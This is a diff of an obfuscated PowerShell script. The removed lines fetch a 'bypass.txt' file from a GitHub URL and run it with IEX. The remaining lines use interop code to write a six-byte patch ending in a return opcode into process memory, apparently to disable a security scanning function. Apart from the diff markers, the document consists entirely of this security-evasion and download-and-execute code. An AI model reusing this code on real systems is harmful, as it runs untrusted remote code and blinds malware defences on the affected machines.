@@ -1,8 +1,3 @@
-$webreq = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt')
-$resp=$webreq.GetResponse()
-$respstream=$resp.GetResponseStream()
-$reader=[System.IO.StreamReader]::new($respstream)
-$content=$reader.ReadToEnd()
 $dcvrj = @"
 using System;
 using System.Runtime.InteropServices;
@@ -28,4 +23,3 @@ $tfwz = "0x80"
 $dufv = "0xC3"
 $scnfh = [Byte[]] ($junr,$ccwg,$boxa,$mcet,+$tfwz,+$dufv)
 [System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)
-IEX($content)
